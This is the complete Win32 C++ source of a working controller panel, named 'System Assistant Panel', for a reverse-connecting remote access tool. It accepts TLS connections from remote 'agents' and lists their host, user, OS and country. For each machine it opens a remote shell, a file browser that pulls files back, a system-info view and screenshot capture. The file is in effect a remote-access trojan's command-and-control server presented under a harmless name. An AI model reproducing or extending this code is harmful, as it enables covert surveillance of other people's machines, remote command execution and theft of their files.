#include "../common/proto.h"
#include "../common/tls.h"
#include "../common/util.h"
#include <commctrl.h>
#include <windowsx.h>
#include <stdio.h>
enum ChildKind { K_SHELL, K_FILES, K_INFO, K_SHOT, K_COUNT };
struct Client {
  TlsCtx tls;
  char host[256], user[256], os[256], country[64];
  HWND wnd[K_COUNT];
  char* shotBmp; uint32_t shotBmpLen;
};
struct Shot { Client* c; char* bmp; uint32_t len; };
#define WM_CLIENT_GONE (WM_APP + 1)
#define WM_CLIENT_SHOT (WM_APP + 2)
static HINSTANCE g_inst;
static HWND g_main, g_list, g_port, g_status;
static Client* g_clients[256]; static int g_clientCount;
static CRITICAL_SECTION g_cs;
static volatile LONG g_listening;
static SOCKET g_listenSock = INVALID_SOCKET;
static PCCERT_CONTEXT g_cert;
static HCERTSTORE g_store;
static bool LoadPfx(const char* path) {
  HANDLE f = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
  if (f == INVALID_HANDLE_VALUE) return false;
  DWORD sz = GetFileSize(f, NULL), n = 0; if (sz == INVALID_FILE_SIZE || !sz) { CloseHandle(f); return false; }
  BYTE* data = (BYTE*)malloc(sz);
  if (!data) { CloseHandle(f); return false; }
  ReadFile(f, data, sz, &n, NULL); CloseHandle(f); if (n != sz) { free(data); return false; }
  CRYPT_DATA_BLOB blob = { sz, data };
  g_store = PFXImportCertStore(&blob, L"", 0); free(data);
  if (!g_store) return false;
  g_cert = CertFindCertificateInStore(g_store, X509_ASN_ENCODING | PKCS_7_ASN_ENCODING, 0, CERT_FIND_ANY, NULL, NULL);
  if (!g_cert) { CertCloseStore(g_store, 0); g_store = NULL; }
  return g_cert != NULL;
}
static void AppendEdit(HWND ed, const char* s, size_t len) {
  if (!ed || !s || !len) return;
  int n = GetWindowTextLengthA(ed);
  char* tmp = (char*)malloc(len + 1); if (!tmp) return;
  memcpy(tmp, s, len); tmp[len] = 0;
  SendMessageA(ed, EM_SETSEL, n, n); SendMessageA(ed, EM_REPLACESEL, FALSE, (LPARAM)tmp);
  free(tmp);
}
static char* Crlf(const char* s) {
  size_t n = strlen(s), j = 0; char* t = (char*)malloc(n * 2 + 1); if (!t) return NULL;
  for (size_t i = 0; i < n; i++) { if (s[i] == '\n' && (i == 0 || s[i - 1] != '\r')) t[j++] = '\r'; t[j++] = s[i]; }
  t[j] = 0; return t;
}
static int RowOf(Client* c) {
  LVITEMA it = {0}; it.mask = LVIF_PARAM;
  for (int i = 0, n = ListView_GetItemCount(g_list); i < n; i++) { it.iItem = i; if (ListView_GetItem(g_list, &it) && (Client*)it.lParam == c) return i; }
  return -1;
}
static Client* ClientAt(int idx) {
  if (idx < 0) return NULL;
  LVITEMA it = {0}; it.mask = LVIF_PARAM; it.iItem = idx;
  return ListView_GetItem(g_list, &it) ? (Client*)it.lParam : NULL;
}
static void RefreshRow(Client* c) {
  int i = RowOf(c); if (i < 0) return; ListView_SetItemText(g_list, i, 0, c->host); ListView_SetItemText(g_list, i, 1, c->user);
  ListView_SetItemText(g_list, i, 2, c->os); ListView_SetItemText(g_list, i, 3, c->country);
}
static void FinalizeClient(Client* c) {
  EnterCriticalSection(&g_cs);
  if (c->tls.sock != INVALID_SOCKET) closesocket(c->tls.sock);
  for (int i = 0; i < g_clientCount; i++) if (g_clients[i] == c) { g_clients[i] = g_clients[--g_clientCount]; break; }
  LeaveCriticalSection(&g_cs);
  int r = RowOf(c); if (r >= 0) ListView_DeleteItem(g_list, r);
  for (int k = 0; k < K_COUNT; k++) if (c->wnd[k]) DestroyWindow(c->wnd[k]);
  free(c->shotBmp); FreeTlsCtx(&c->tls); free(c);
}
static void Hello(Client* c, char* pl) {
  char* a = strchr(pl, '|'); if (a) { *a = 0; strncpy(c->host, pl, 255); }
  char* b = a ? strchr(a + 1, '|') : NULL; char* d = b ? strchr(b + 1, '|') : NULL;
  if (d) { *d = 0; strncpy(c->country, d + 1, sizeof(c->country) - 1); }
  if (b) { *b = 0; strncpy(c->user, a + 1, 255); strncpy(c->os, b + 1, 255); } else strcpy(c->os, "Windows");
  if (!c->country[0]) strcpy(c->country, "?");
  LVITEMA it = {0}; it.mask = LVIF_TEXT | LVIF_PARAM; it.iItem = ListView_GetItemCount(g_list); it.lParam = (LPARAM)c; it.pszText = c->host; ListView_InsertItem(g_list, &it);
  RefreshRow(c);
}
static void FillFiles(Client* c, char* pl, uint32_t plLen) {
  HWND lv = GetDlgItem(c->wnd[K_FILES], 1);
  if (!lv) return;
  ListView_DeleteAllItems(lv);
  if (plLen > 4 && !strncmp(pl, "ERR|", 4)) {
    MessageBoxA(c->wnd[K_FILES], "File error (path not found or access denied)", "Files", MB_ICONWARNING);
    return;
  }
  char* line = pl; char* end = pl + plLen; int i = 0;
  while (line < end) {
    char* nl = strchr(line, '\n'); if (nl) *nl = 0;
    char* p1 = strchr(line, '|');
    if (p1) {
      *p1 = 0; LVITEMA it = {0}; it.mask = LVIF_TEXT; it.iItem = i; it.pszText = line;
      int idx = ListView_InsertItem(lv, &it); ListView_SetItemText(lv, idx, 1, p1 + 1); i++;
    }
    if (!nl) break; line = nl + 1;
  }
}
static void SaveFile(Client* c, const char* pl, uint32_t plLen) {
  if (!c->wnd[K_FILES] || plLen < 3) return;
  const char* nl = (const char*)memchr(pl + 1, '\n', plLen - 1); if (!nl) return;
  if (pl[0] == 'E') {
    char msg[256]; size_t mlen = (size_t)(nl - pl) - 1; if (mlen > sizeof(msg) - 24) mlen = sizeof(msg) - 24;
    memcpy(msg, "Download failed: ", 17); memcpy(msg + 17, pl + 1, mlen); msg[17 + mlen] = 0;
    MessageBoxA(c->wnd[K_FILES], msg, "Download", MB_ICONWARNING); return;
  }
  if (pl[0] != 'D') return;
  size_t pathLen = (size_t)(nl - pl) - 1, start = 1;
  for (size_t i = 1; i <= pathLen; i++) if (pl[i] == '\\' || pl[i] == '/') start = i + 1;
  char name[MAX_PATH]; size_t k = 0;
  for (size_t i = start; i <= pathLen && k < sizeof(name) - 1; i++) {
    unsigned char ch = (unsigned char)pl[i]; name[k++] = ch < 32 || strchr("<>:\"/\\|?*", ch) ? '_' : (char)ch;
  }
  name[k] = 0;
  if (!name[0] || !strcmp(name, ".") || !strcmp(name, "..")) strcpy(name, "last.bin");
  uint32_t off = (uint32_t)(nl + 1 - pl), dataLen = plLen - off;
  CreateDirectoryA("downloads", NULL);
  char outPath[MAX_PATH + 16]; snprintf(outPath, sizeof(outPath), "downloads\\%s", name);
  if (WriteFileAll(outPath, pl + off, dataLen)) MessageBoxA(c->wnd[K_FILES], outPath, "Saved", MB_ICONINFORMATION);
  else MessageBoxA(c->wnd[K_FILES], "Write failed", "Save", MB_ICONERROR);
}
static DWORD WINAPI ClientThread(LPVOID p) {
  Client* c = (Client*)p;
  if (!TlsAcquire(&c->tls, g_cert) || !TlsHandshake(&c->tls)) { closesocket(c->tls.sock); FreeTlsCtx(&c->tls); free(c); return 0; }
  EnterCriticalSection(&g_cs);
  bool ok = g_clientCount < 256; if (ok) g_clients[g_clientCount++] = c;
  LeaveCriticalSection(&g_cs);
  if (!ok) { closesocket(c->tls.sock); FreeTlsCtx(&c->tls); free(c); return 0; }
  uint16_t cmd = 0; char* pl = NULL; uint32_t plLen = 0;
  for (;;) {
    if (!TlsRecvMsg(&c->tls, &cmd, &pl, &plLen)) break;
    switch (cmd) {
      case C_HELLO: if (pl) Hello(c, pl); break;
      case C_SHELL_DATA: if (c->wnd[K_SHELL]) AppendEdit(GetDlgItem(c->wnd[K_SHELL], 1), pl, plLen); break;
      case C_SHELL_CLOSE: if (c->wnd[K_SHELL]) AppendEdit(GetDlgItem(c->wnd[K_SHELL], 1), "\r\n[shell closed]\r\n", 18); break;
      case C_FS_LIST_RESP: if (c->wnd[K_FILES]) FillFiles(c, pl, plLen); break;
      case C_FS_FILE: SaveFile(c, pl, plLen); break;
      case C_SYSINFO: {
        char* t = Crlf(pl ? pl : ""); HWND info = GetDlgItem(c->wnd[K_INFO], 1);
        if (info) SetWindowTextA(info, t); else MessageBoxA(g_main, t, "SysInfo", MB_ICONINFORMATION);
        free(t); break;
      }
      case C_SCREEN_IMG: {
        Shot* s = (Shot*)malloc(sizeof(Shot));
        if (s && (s->bmp = (char*)malloc(plLen ? plLen : 1))) {
          s->c = c; s->len = plLen; memcpy(s->bmp, pl, plLen);
          if (PostMessageA(g_main, WM_CLIENT_SHOT, 0, (LPARAM)s)) break;
          free(s->bmp);
        }
        free(s); break;
      }
      case C_BYE: free(pl); pl = NULL; goto out;
    }
    if (pl) free(pl);
  }
out:
  PostMessageA(g_main, WM_CLIENT_GONE, 0, (LPARAM)c);
  return 0;
}
static DWORD WINAPI AcceptThread(LPVOID) {
  for (;;) {
    SOCKET s = accept(g_listenSock, NULL, NULL);
    if (s == INVALID_SOCKET) break;
    Client* c = (Client*)calloc(1, sizeof(Client));
    if (!c) { closesocket(s); continue; }
    InitTlsCtx(&c->tls, s); HANDLE th = CreateThread(NULL, 0, ClientThread, c, 0, NULL);
    if (th) CloseHandle(th); else { closesocket(s); FreeTlsCtx(&c->tls); free(c); }
  }
  return 0;
}
#define IDC_SHELLIN 201
#define IDC_SHELLSEND 202
#define IDC_FPATH 301
#define IDC_FREFRESH 302
#define IDC_FGET 303
#define IDC_FENTER 304
#define IDC_LIST 101
#define IDC_PORT 102
#define IDC_LISTEN 103
#define IDM_SHELL 200
#define IDM_FILES 201
#define IDM_INFO 202
#define IDM_SHOT 203
#define IDM_DROP 204
static const struct { int id; const char* text; } kMenu[] = {
  {IDM_SHELL, "Remote shell"}, {IDM_FILES, "File manager"}, {IDM_INFO, "System info"}, {IDM_SHOT, "Screenshot"}, {0, NULL}, {IDM_DROP, "Disconnect client"},
};
static HWND FocusChild(Client* c, int kind) {
  if (!c->wnd[kind]) return NULL; SetForegroundWindow(c->wnd[kind]); return c->wnd[kind];
}
static int KindOf(Client* c, HWND h) {
  for (int k = 0; c && k < K_COUNT; k++) if (c->wnd[k] == h) return k; return -1;
}
static void Fit(HWND h) {
  RECT rc; GetClientRect(h, &rc); SendMessageA(h, WM_SIZE, 0, MAKELPARAM(rc.right, rc.bottom));
}
static void ChildLayout(HWND h, int kind, int w, int ht) {
  if (kind == K_SHELL) {
    MoveWindow(GetDlgItem(h, 1), 0, 0, w, ht - 34, TRUE); MoveWindow(GetDlgItem(h, IDC_SHELLIN), 4, ht - 30, w - 90, 24, TRUE);
    MoveWindow(GetDlgItem(h, IDC_SHELLSEND), w - 82, ht - 30, 78, 24, TRUE);
  } else if (kind == K_FILES) {
    MoveWindow(GetDlgItem(h, IDC_FPATH), 4, 4, w - 96, 24, TRUE); MoveWindow(GetDlgItem(h, IDC_FREFRESH), w - 88, 4, 84, 24, TRUE);
    MoveWindow(GetDlgItem(h, IDC_FGET), 4, ht - 28, 90, 24, TRUE); MoveWindow(GetDlgItem(h, 1), 0, 32, w, ht - 66, TRUE);
  } else if (kind == K_INFO) MoveWindow(GetDlgItem(h, 1), 0, 0, w, ht, TRUE);
}
static LRESULT CALLBACK ShellEditProc(HWND h, UINT m, WPARAM wp, LPARAM lp, UINT_PTR, DWORD_PTR) {
  if (m == WM_KEYDOWN && wp == VK_RETURN) { SendMessageA(GetParent(h), WM_COMMAND, MAKEWPARAM(IDC_SHELLSEND, BN_CLICKED), 0); return 0; }
  return DefSubclassProc(h, m, wp, lp);
}
static bool SelIsDir(HWND lv) {
  char a[32] = ""; int sel = ListView_GetNextItem(lv, -1, LVNI_SELECTED); if (sel < 0) return false;
  ListView_GetItemText(lv, sel, 1, a, sizeof(a)); size_t n = strlen(a); return n && a[n - 1] == 'd';
}
static void JoinPath(char* out, size_t n, const char* base, const char* name) {
  if (!strcmp(name, ".")) { snprintf(out, n, "%s", base); return; }
  if (!strcmp(name, "..")) {
    snprintf(out, n, "%s", base); char* s = strrchr(out, '\\');
    if (s && s > out + 2) *s = 0; else if (out[1] == ':') snprintf(out, n, "%.2s\\", out);
    return;
  }
  snprintf(out, n, "%s\\%s", base, name);
}
static void FilesNav(Client* c, HWND h) {
  HWND lv = GetDlgItem(h, 1); char p[MAX_PATH], full[MAX_PATH * 2];
  GetWindowTextA(GetDlgItem(h, IDC_FPATH), p, sizeof(p));
  if (!SelIsDir(lv)) { TlsSendMsg(&c->tls, C_FS_LIST, p, strlen(p)); return; }
  char name[MAX_PATH]; int sel = ListView_GetNextItem(lv, -1, LVNI_SELECTED); ListView_GetItemText(lv, sel, 0, name, sizeof(name));
  JoinPath(full, sizeof(full), p, name); SetWindowTextA(GetDlgItem(h, IDC_FPATH), full);
  TlsSendMsg(&c->tls, C_FS_LIST, full, strlen(full));
}
static LRESULT CALLBACK FilesListProc(HWND h, UINT m, WPARAM wp, LPARAM lp, UINT_PTR, DWORD_PTR) {
  if (m == WM_KEYDOWN && wp == VK_RETURN) { SendMessageA(GetParent(h), WM_COMMAND, MAKEWPARAM(IDC_FENTER, BN_CLICKED), 0); return 0; }
  return DefSubclassProc(h, m, wp, lp);
}
static void ChildCommand(Client* c, int kind, HWND h, int id) {
  if (!c) return;
  if (kind == K_SHELL && id == IDC_SHELLSEND) {
    char buf[1024]; HWND in = GetDlgItem(h, IDC_SHELLIN);
    GetWindowTextA(in, buf, sizeof(buf) - 3); SetWindowTextA(in, ""); strcat(buf, "\r\n");
    TlsSendMsg(&c->tls, C_SHELL_DATA, buf, strlen(buf)); SetFocus(in);
  } else if (kind == K_FILES && id == IDC_FREFRESH) {
    char p[MAX_PATH]; GetWindowTextA(GetDlgItem(h, IDC_FPATH), p, sizeof(p));
    TlsSendMsg(&c->tls, C_FS_LIST, p, strlen(p));
  } else if (kind == K_FILES && id == IDC_FGET) {
    if (SelIsDir(GetDlgItem(h, 1))) { MessageBoxA(h, "Select a file, not a folder", "Download", MB_ICONINFORMATION); return; }
    char name[MAX_PATH]; int sel = ListView_GetNextItem(GetDlgItem(h, 1), -1, LVNI_SELECTED);
    if (sel < 0) return;
    ListView_GetItemText(GetDlgItem(h, 1), sel, 0, name, sizeof(name));
    char p[MAX_PATH]; GetWindowTextA(GetDlgItem(h, IDC_FPATH), p, sizeof(p));
    char full[MAX_PATH * 2 + 2]; snprintf(full, sizeof(full), "%s\\%s", p, name);
    TlsSendMsg(&c->tls, C_FS_GET, full, strlen(full));
  } else if (kind == K_FILES && id == IDC_FENTER) FilesNav(c, h);
}
static bool BmpOk(Client* c) {
  if (!c->shotBmp || c->shotBmpLen < sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER)) return false;
  BITMAPFILEHEADER* fh = (BITMAPFILEHEADER*)c->shotBmp; BITMAPINFOHEADER* ih = (BITMAPINFOHEADER*)(c->shotBmp + sizeof(*fh));
  if (fh->bfType != 0x4D42 || ih->biSize < sizeof(BITMAPINFOHEADER) || fh->bfOffBits < sizeof(*fh) + ih->biSize) return false;
  if (ih->biPlanes != 1 || ih->biCompression != BI_RGB) return false;
  switch (ih->biBitCount) { case 1: case 4: case 8: case 16: case 24: case 32: break; default: return false; }
  int64_t w = ih->biWidth, h = ih->biHeight < 0 ? -(int64_t)ih->biHeight : ih->biHeight;
  if (w <= 0 || h <= 0 || w > 16384 || h > 16384) return false;
  uint64_t row = ((uint64_t)w * ih->biBitCount + 31) / 32 * 4;
  return fh->bfOffBits + row * (uint64_t)h <= c->shotBmpLen;
}
static void ChildPaint(Client* c, HWND h) {
  PAINTSTRUCT ps; HDC dc = BeginPaint(h, &ps);
  if (c && BmpOk(c)) {
    BITMAPFILEHEADER* fh = (BITMAPFILEHEADER*)c->shotBmp;
    BITMAPINFO* bi = (BITMAPINFO*)(c->shotBmp + sizeof(*fh));
    void* px = (void*)(c->shotBmp + fh->bfOffBits);
    RECT rc; GetClientRect(h, &rc);
    SetStretchBltMode(dc, HALFTONE);
    StretchDIBits(dc, 0, 0, rc.right, rc.bottom, 0, 0, bi->bmiHeader.biWidth, bi->bmiHeader.biHeight, px, bi, DIB_RGB_COLORS, SRCCOPY);
  } else TextOutA(dc, 10, 10, "no screenshot yet", 17);
  EndPaint(h, &ps);
}
static LRESULT CALLBACK ChildProc(HWND h, UINT m, WPARAM wp, LPARAM lp) {
  Client* c = (Client*)GetWindowLongPtrA(h, GWLP_USERDATA);
  const int kind = KindOf(c, h);
  switch (m) {
    case WM_SIZE: if (kind >= 0) ChildLayout(h, kind, LOWORD(lp), HIWORD(lp)); return 0;
    case WM_COMMAND: if (kind >= 0) ChildCommand(c, kind, h, LOWORD(wp)); return 0;
    case WM_PAINT: if (kind == K_SHOT) { ChildPaint(c, h); return 0; } break;
    case WM_NOTIFY: { NMHDR* nh = (NMHDR*)lp; if (kind == K_FILES && nh && nh->idFrom == 1 && nh->code == NM_DBLCLK) { FilesNav(c, h); return 0; } break; }
    case WM_DESTROY: if (kind >= 0) c->wnd[kind] = NULL; SetWindowLongPtrA(h, GWLP_USERDATA, 0); return 0;
  }
  return DefWindowProcA(h, m, wp, lp);
}
static HWND MakeChild(const char* cls, const char* title, int kind, Client* c, int w, int h) {
  WNDCLASSA wc = {0}; wc.lpfnWndProc = ChildProc; wc.hInstance = g_inst; wc.hCursor = LoadCursor(NULL, IDC_ARROW); wc.hbrBackground = (HBRUSH)(COLOR_BTNFACE + 1);
  wc.lpszClassName = cls; RegisterClassA(&wc);
  HWND wnd = CreateWindowExA(0, cls, title, WS_OVERLAPPEDWINDOW | WS_VISIBLE, CW_USEDEFAULT, CW_USEDEFAULT, w, h, g_main, NULL, g_inst, NULL);
  SetWindowLongPtrA(wnd, GWLP_USERDATA, (LONG_PTR)c);
  return wnd;
}
static void OpenShell(Client* c) {
  if (FocusChild(c, K_SHELL)) return;
  char title[512]; sprintf(title, "Shell - %s", c->host);
  HWND h = c->wnd[K_SHELL] = MakeChild("OAShell", title, K_SHELL, c, 720, 500); if (!h) return;
  CreateWindowExA(WS_EX_CLIENTEDGE, "EDIT", "", WS_CHILD | WS_VISIBLE | ES_MULTILINE | ES_AUTOVSCROLL | WS_VSCROLL | ES_READONLY, 0, 0, 100, 100, h, (HMENU)1, g_inst, NULL);
  CreateWindowExA(WS_EX_CLIENTEDGE, "EDIT", "", WS_CHILD | WS_VISIBLE | ES_AUTOHSCROLL, 0, 0, 100, 24, h, (HMENU)IDC_SHELLIN, g_inst, NULL); SetWindowSubclass(GetDlgItem(h, IDC_SHELLIN), ShellEditProc, 0, 0); CreateWindowExA(0, "BUTTON", "Send", WS_CHILD | WS_VISIBLE, 0, 0, 78, 24, h, (HMENU)IDC_SHELLSEND, g_inst, NULL);
  Fit(h); TlsSendMsg(&c->tls, C_SHELL_START, NULL, 0);
}
static void OpenFiles(Client* c) {
  if (FocusChild(c, K_FILES)) {
    SendMessage(GetDlgItem(c->wnd[K_FILES], IDC_FREFRESH), BM_CLICK, 0, 0); return;
  }
  char title[512]; sprintf(title, "Files - %s", c->host);
  HWND h = c->wnd[K_FILES] = MakeChild("OAFiles", title, K_FILES, c, 760, 520); if (!h) return;
  CreateWindowExA(WS_EX_CLIENTEDGE, "EDIT", "C:\\", WS_CHILD | WS_VISIBLE | ES_AUTOHSCROLL, 0, 0, 100, 24, h, (HMENU)IDC_FPATH, g_inst, NULL);
  CreateWindowExA(0, "BUTTON", "Refresh", WS_CHILD | WS_VISIBLE, 0, 0, 84, 24, h, (HMENU)IDC_FREFRESH, g_inst, NULL);
  HWND lv = CreateWindowExA(0, WC_LISTVIEWA, "", WS_CHILD | WS_VISIBLE | LVS_REPORT | LVS_SHOWSELALWAYS, 0, 0, 100, 100, h, (HMENU)1, g_inst, NULL); SetWindowSubclass(lv, FilesListProc, 0, 0);
  ListView_SetExtendedListViewStyle(lv, LVS_EX_FULLROWSELECT);
  LVCOLUMNA col = {0}; col.mask = LVCF_TEXT | LVCF_WIDTH;
  col.pszText = (LPSTR)"Name"; col.cx = 300; ListView_InsertColumn(lv, 0, &col); col.pszText = (LPSTR)"Size|Attr"; col.cx = 160; ListView_InsertColumn(lv, 1, &col);
  CreateWindowExA(0, "BUTTON", "Download", WS_CHILD | WS_VISIBLE, 0, 0, 90, 24, h, (HMENU)IDC_FGET, g_inst, NULL);
  Fit(h); SendMessage(GetDlgItem(h, IDC_FREFRESH), BM_CLICK, 0, 0);
}
static void OpenInfo(Client* c) {
  if (!FocusChild(c, K_INFO)) {
    char title[512]; sprintf(title, "SysInfo - %s", c->host); HWND h = c->wnd[K_INFO] = MakeChild("OAInfo", title, K_INFO, c, 620, 620); if (!h) return;
    CreateWindowExA(WS_EX_CLIENTEDGE, "EDIT", "requesting...", WS_CHILD | WS_VISIBLE | ES_MULTILINE | WS_VSCROLL | WS_HSCROLL | ES_AUTOVSCROLL | ES_AUTOHSCROLL | ES_READONLY, 0, 0, 100, 100, h, (HMENU)1, g_inst, NULL); Fit(h);
  }
  TlsSendMsg(&c->tls, C_SYSINFO, NULL, 0);
}
static void OpenShot(Client* c) {
  if (!FocusChild(c, K_SHOT)) {
    char title[512]; sprintf(title, "Screen - %s", c->host); HWND h = c->wnd[K_SHOT] = MakeChild("OAShot", title, K_SHOT, c, 900, 560); if (!h) return;
  }
  TlsSendMsg(&c->tls, C_SCREEN, NULL, 0);
}
static LRESULT CALLBACK MainProc(HWND h, UINT m, WPARAM wp, LPARAM lp) {
  switch (m) {
    case WM_SIZE: {
      int w = LOWORD(lp), ht = HIWORD(lp), bx = w > 180 ? w - 180 : 0;
      if (g_list) MoveWindow(g_list, 0, 36, w, ht > 58 ? ht - 58 : 0, TRUE);
      if (g_port) MoveWindow(g_port, bx > 80 ? bx - 80 : 0, 6, 72, 24, TRUE);
      HWND b = GetDlgItem(h, IDC_LISTEN); if (b) MoveWindow(b, bx, 5, 170, 26, TRUE);
      if (g_status) MoveWindow(g_status, 0, ht > 22 ? ht - 22 : 0, w, 22, TRUE);
      return 0;
    }
    case WM_CONTEXTMENU: {
      if ((HWND)wp != g_list) break;
      POINT pt = { GET_X_LPARAM(lp), GET_Y_LPARAM(lp) }; LVHITTESTINFO ht = {0}; ht.pt = pt; ScreenToClient(g_list, &ht.pt);
      int idx = ListView_HitTest(g_list, &ht); if (idx < 0) break;
      ListView_SetItemState(g_list, idx, LVIS_SELECTED | LVIS_FOCUSED, LVIS_SELECTED | LVIS_FOCUSED);
      Client* c = ClientAt(idx); if (!c) break;
      HMENU menu = CreatePopupMenu();
      for (auto& mi : kMenu) AppendMenuA(menu, mi.text ? MF_STRING : MF_SEPARATOR, mi.id, mi.text);
      TrackPopupMenu(menu, TPM_RIGHTBUTTON, pt.x, pt.y, 0, h, NULL); DestroyMenu(menu); return 0;
    }
    case WM_COMMAND: {
      if (LOWORD(wp) == IDC_LISTEN) {
        if (InterlockedExchange(&g_listening, 1)) return 0;
        char port[16]; GetWindowTextA(g_port, port, sizeof(port));
        addrinfo* ai = NULL; addrinfo hints = {0}; hints.ai_family = AF_INET; hints.ai_socktype = SOCK_STREAM; hints.ai_flags = AI_PASSIVE;
        getaddrinfo(NULL, *port ? port : "8443", &hints, &ai);
        g_listenSock = socket(AF_INET, SOCK_STREAM, 0); int one = 1;
        setsockopt(g_listenSock, SOL_SOCKET, SO_REUSEADDR, (char*)&one, sizeof(one));
        if (bind(g_listenSock, ai ? ai->ai_addr : NULL, (int)(ai ? ai->ai_addrlen : sizeof(sockaddr_in))) || listen(g_listenSock, 16)) {
          MessageBoxA(h, "bind/listen failed", "Error", MB_ICONERROR); closesocket(g_listenSock);
          InterlockedExchange(&g_listening, 0); return 0;
        }
        if (ai) freeaddrinfo(ai);
        HANDLE th = CreateThread(NULL, 0, AcceptThread, NULL, 0, NULL); if (th) CloseHandle(th);
        else { closesocket(g_listenSock); g_listenSock = INVALID_SOCKET; InterlockedExchange(&g_listening, 0); MessageBoxA(h, "cannot start accept thread", "Error", MB_ICONERROR); return 0; }
        SendMessage(g_status, SB_SETTEXTA, 0, (LPARAM)"listening"); return 0;
      }
      int idx = ListView_GetNextItem(g_list, -1, LVNI_SELECTED); if (idx < 0) return 0;
      Client* c = ClientAt(idx); if (!c) return 0;
      switch (LOWORD(wp)) {
        case IDM_SHELL: OpenShell(c); return 0;
        case IDM_FILES: OpenFiles(c); return 0;
        case IDM_INFO: OpenInfo(c); return 0;
        case IDM_SHOT: OpenShot(c); return 0;
        case IDM_DROP: TlsSendMsg(&c->tls, C_BYE, NULL, 0); return 0;
      }
      return 0;
    }
    case WM_CLIENT_GONE: FinalizeClient((Client*)lp); return 0;
    case WM_CLIENT_SHOT: {
      Shot* s = (Shot*)lp; Client* c = s->c; free(c->shotBmp); c->shotBmp = s->bmp; c->shotBmpLen = s->len; free(s);
      if (c->wnd[K_SHOT]) { InvalidateRect(c->wnd[K_SHOT], NULL, TRUE); UpdateWindow(c->wnd[K_SHOT]); }
      return 0;
    }
    case WM_DESTROY: PostQuitMessage(0); return 0;
  }
  return DefWindowProcA(h, m, wp, lp);
}
int WINAPI WinMain(HINSTANCE inst, HINSTANCE, LPSTR, int) {
  g_inst = inst; InitializeCriticalSection(&g_cs);
  WSADATA w; if (WSAStartup(MAKEWORD(2, 2), &w)) return 1; InitCommonControls();
  if (!LoadPfx("cert.pfx")) { MessageBoxA(NULL, "Failed to load cert.pfx", "Error", MB_ICONERROR); return 1; }
  WNDCLASSA wc = {0}; wc.lpfnWndProc = MainProc; wc.hInstance = inst;
  wc.hCursor = LoadCursor(NULL, IDC_ARROW); wc.hbrBackground = (HBRUSH)(COLOR_BTNFACE + 1);
  wc.lpszClassName = "OpenAssistPanel"; wc.hIcon = LoadIcon(NULL, IDI_APPLICATION); RegisterClassA(&wc);
  g_main = CreateWindowExA(0, "OpenAssistPanel", "System Assistant Panel", WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, 860, 480, NULL, NULL, inst, NULL);
  if (!g_main) return 1;
  CreateWindowExA(0, "STATIC", "Agents connect to you.", WS_CHILD | WS_VISIBLE, 10, 8, 300, 18, g_main, NULL, inst, NULL);
  g_port = CreateWindowExA(WS_EX_CLIENTEDGE, "EDIT", "8443", WS_CHILD | WS_VISIBLE | ES_NUMBER, 0, 0, 60, 22, g_main, (HMENU)IDC_PORT, inst, NULL);
  CreateWindowExA(0, "BUTTON", "Start listening", WS_CHILD | WS_VISIBLE, 0, 0, 170, 26, g_main, (HMENU)IDC_LISTEN, inst, NULL);
  g_list = CreateWindowExA(0, WC_LISTVIEWA, "", WS_CHILD | WS_VISIBLE | LVS_REPORT | LVS_SHOWSELALWAYS, 0, 36, 800, 300, g_main, (HMENU)IDC_LIST, inst, NULL);
  ListView_SetExtendedListViewStyle(g_list, LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES);
  struct { const char* t; int cx; } cols[] = { {"Host", 160}, {"User", 140}, {"OS", 140}, {"Country", 140} };
  LVCOLUMNA col = {0}; col.mask = LVCF_TEXT | LVCF_WIDTH; for (int i = 0; i < 4; i++) { col.pszText = (LPSTR)cols[i].t; col.cx = cols[i].cx; ListView_InsertColumn(g_list, i, &col); }
  g_status = CreateWindowExA(0, STATUSCLASSNAMEA, "idle", WS_CHILD | WS_VISIBLE, 0, 0, 800, 22, g_main, NULL, inst, NULL);
  RECT rc; GetClientRect(g_main, &rc); SendMessageA(g_main, WM_SIZE, 0, MAKELPARAM(rc.right, rc.bottom)); ShowWindow(g_main, SW_SHOW);
  MSG msg;
  while (GetMessageA(&msg, NULL, 0, 0)) { TranslateMessage(&msg); DispatchMessageA(&msg); }
  return 0;
}
